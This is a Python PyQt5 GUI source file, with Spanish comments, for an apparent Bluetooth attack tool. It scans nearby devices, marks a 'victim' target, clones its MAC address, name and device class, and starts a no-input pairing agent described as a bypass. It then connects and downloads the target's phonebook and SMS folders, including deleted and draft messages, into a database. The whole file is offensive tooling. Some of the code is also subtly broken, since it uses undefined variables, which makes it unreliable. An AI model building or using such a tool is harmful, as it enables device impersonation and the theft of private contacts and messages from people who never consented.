from PyQt5.QtWidgets import QApplication, QMainWindow, QVBoxLayout, QWidget, QTextEdit, QPushButton, QComboBox, QTabWidget, QLabel, QLineEdit, QListWidget, QListWidgetItem
import bluetooth
import subprocess
from pprint import pprint
import pbapclient
import createDatabase
import shutil
import updateName
import getMac
import mapclient
import concurrent.futures
import ubscan


class BluetoothConfigurator(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("BT-Project")
       

        # Crear pestanias
        self.tab_widget = QTabWidget()
        self.bluetooth_tab = QWidget()
        self.agendaTel_tab = QWidget()
        self.conect_tab = QWidget()

        self.tab_widget.addTab(self.conect_tab, "Connect")
        self.tab_widget.addTab(self.bluetooth_tab, "Configuracion")
        self.tab_widget.addTab(self.agendaTel_tab, "Descargar Datos")

        # Organizar Widgets de la ventana donde se realiza el escaneo, clonacion, conexion y fijar victima
        conect_layout = QVBoxLayout()
        
        self.conect_tab.setLayout(conect_layout)
        
        scan_button = QPushButton("Escanear")
        set_button = QPushButton("Set Target")
        conect_button = QPushButton("Conectar")
        
        clon_button = QPushButton("Clonar")
        # Inicializamos el objeto BluetoothScanner
        self.ubertooth_scanner = ubscan.BluetoothScanner()
        
        self.scan_list = QListWidget()
        time_label = QLabel("Tiempo de escaneo")
        self.time_entry= QLineEdit()
        
        
        conect_layout.addWidget(time_label)
        conect_layout.addWidget(self.time_entry)
        conect_layout.addWidget(scan_button)
        conect_layout.addWidget(self.scan_list)
        conect_layout.addWidget(set_button)
        conect_layout.addWidget(conect_button)
        conect_layout.addWidget(clon_button)


        # Organizar widgets de la ventana de configuracion
        bluetooth_layout = QVBoxLayout()
        self.bluetooth_tab.setLayout(bluetooth_layout)

        name_label = QLabel("Nombre:")
        self.name_entry = QLineEdit()

        address_label = QLabel("Direccion:")
        self.address_entry = QLineEdit()

        classm_label = QLabel("Class of Device:")
        self.classm_entry = QLineEdit()

        update_button = QPushButton("Configurar")

        bluetooth_layout.addWidget(name_label)
        bluetooth_layout.addWidget(self.name_entry)
        bluetooth_layout.addWidget(address_label)
        bluetooth_layout.addWidget(self.address_entry)
        bluetooth_layout.addWidget(classm_label)
        bluetooth_layout.addWidget(self.classm_entry)
        bluetooth_layout.addWidget(update_button)


        # Organizar widgets de la ventana de descarga de datos
        agenda_layout = QVBoxLayout()
        self.agendaTel_tab.setLayout(agenda_layout)


        descarga_button = QPushButton("Descargar Agenda Telefonica")
        desMsg_button = QPushButton("Descargar SMS y Mensajes")
        agenda_layout.addWidget(descarga_button)
        agenda_layout.addWidget(desMsg_button)

        # Organizar pestanias en la ventana principal
        main_layout = QVBoxLayout()
        main_layout.addWidget(self.tab_widget)
        self.setLayout(main_layout)

        # Conectar botones a las funciones
        conect_button.clicked.connect(self.conect_device)
        set_button.clicked.connect(self.setTarget)
        update_button.clicked.connect(self.update_bluetooth_config)
        scan_button.clicked.connect(self.scan_devices)
        clon_button.clicked.connect(self.clon_devices)
        descarga_button.clicked.connect(self.descarga_agenda)
        desMsg_button.clicked.connect(self.descarga_sms)

    def conect_device(self):
        #Llamar a la funcion que fija el objetivo
        self.setTarget()
        # Se crea un objeto socket de Bluetooth para establecer conexion con el dispositivo seleccionado y si la conexion es rechazada debido al puerto rfcomm, se utiliza el comando bluetoothctl
        try:
            # Intenta establecer la conexion utilizando BluetoothSocket
            sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
            sock.connect((mac_address, 3))
            print("Conexión Bluetooth establecida.")

        except bluetooth.btcommon.BluetoothError as e:
            print("Error al conectar utilizando BluetoothSocket:", str(e))
            print("Intentando conexión utilizando bluetoothctl...")

        try:
            # Intenta establecer la conexion utilizando bluetoothctl
            subprocess.run(['bluetoothctl', 'connect', mac_address], capture_output=True)
            print("Conexión Bluetooth establecida utilizando bluetoothctl.")
        except subprocess.CalledProcessError as e:
            print("Error al conectar utilizando bluetoothctl:", str(e))

    def setTarget(self):
        #Llamar a la funcion que activa el agente para el bypass
        self.agent_daemon()
        #Obtener el item de la lista que ha sido seleccionado
        item = self.scan_list.currentItem()
        #Si existe el item, que obtenga el indice del objeto para poder sacar la direccion bluetooth
        if item:
            item_index = self.scan_list.row(item)
            mac_address = self.mac_addresses.get(item_index, "")
            name = self.name_entry.text()
        # Se guardan en variables globales del objeto para poder acceder mas tarde
        self.target_mac = mac_address
        self.target_name = name
            
    def update_bluetooth_config(self):
        # Recibe la informacion pasada en los inputs
        name = self.name_entry.text()
        address = self.address_entry.text()
        cod = self.classm_entry.text()
        # Llama a la funcion encargada de establecer dichos parametros en el adaptador bluetooth, ademas pasa el CoD como entero
        updateName.clone_device(address,name,int(cod))

    def scan_devices(self):
        #Se recibe el tiempo que durara el escaeno
        tiempo = self.time_entry.text()
        # Se llama a la funcion del objeto BluetoothScanner que se encarga de escanear dispositivos bluetooth
        self.ubertooth_scanner.start_scan(duration=tiempo)
        # Se llama a la funcion del objeto BluetoothScanner que se encarga de devlolver los dispositivos encontrados
        devices = self.ubertooth_scanner.get_devices()
        self.scan_list.clear()
        self.mac_addresses = {}  # Diccionario para almacenar las MAC addresses por nombre
        self.class_of_devices = {}  # Diccionario para almacenar las Class of Device por nombre
        
        self.item_counter = 0  # Reiniciar el contador
        #Por cada dispositivo va sacando los valores y los guarda en las variables, ademas del nombre que lo guarda en la lista de la GUI
        for device in devices:
            mac_address = device[0]
            name = device[1]
            class_of_device = device[2]

            item = QListWidgetItem(name)
            item.setData(0, name)  # Guardar el mac_address en el elemento de lista
            self.scan_list.addItem(item)

            self.mac_addresses[self.item_counter] = mac_address  # Asociar el índice con la MAC address
            self.class_of_devices[self.item_counter] = class_of_device  # Asociar el índice con la Class of Device
            self.item_counter += 1  # Incrementar el contador

        self.scan_list.itemClicked.connect(self.handle_item_click)

    def handle_item_click(self, item):
        name = item.data(0)

        self.name_entry.setText(name)

    def clon_devices(self):
       #Obtener el item de la lista que ha sido seleccionado
        item = self.scan_list.currentItem()
        #Si existe el item, que obtenga el indice del objeto para poder sacar la direccion bluetooth, el nombre ye el CoD
        if item:
            item_index = self.scan_list.row(item)  # Obtener el índice del elemento en la lista
            mac_address = self.mac_addresses.get(item_index, "")
            name = self.name_entry.text()
            class_of_device = self.class_of_devices.get(item_index, "")
        # Llama a la funcion encargada de establecer dichos parametros en el adaptador bluetooth, ademas pasa el CoD como entero
        updateName.clone_device(mac_address, name, class_of_device)

    def agent_daemon(self):
        # Ejecuta como daemon el agente bluetooth definido como NoInputNoOutput
        subprocess.run(["bt-agent", "-c", "NoInputNoOutput", "-d"])

    def descarga_agenda(self):
        #Recibe el nombre de la tabla y direccion bluetooth de las variables globales que guardan el objetivo
        target = self.target_mac
        tabla = self.target_name
        # Ejecuta el script pbapclient para descargarse la agenda telefonica
        pbapclient.main(target,tabla)
        # Crea la tabla con los contactos
        createDatabase.createTableContacts(tabla)
    def descarga_sms(self):
        #Recibe el nombre de la tabla y direccion bluetooth de las variables globales que guardan el objetivo
        target = self.target_mac
        tabla = self.target_name
        # Ejecuta el script pbapclient para descargarse los SMS y MMS
        mapclient.main(target,tabla)
        # Se crean threads para ejecutar de manera concurrente las funciones para crear las tablas de los mensajes recibidos, enviados, borrados y en borrador
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            subfold='inbox'
            executor.submit(createDatabase.createTableMsg(tabla=tabla,subfold=subfold))
            subfold='outbox'
            executor.submit(createDatabase.createTableMsg(tabla=tabla,subfold=subfold))
            subfold='deleted'
            executor.submit(createDatabase.createTableMsg(tabla=tabla,subfold=subfold))
            subfold = 'draft'
            executor.submit(createDatabase.createTableMsg(tabla=tabla,subfold=subfold))
            subfold='sent'
            executor.submit(createDatabase.createTableMsg(tabla=tabla,subfold=subfold))



if __name__ == "__main__":
    app = QApplication([])
    window = BluetoothConfigurator()
    window.show()
    app.exec_()
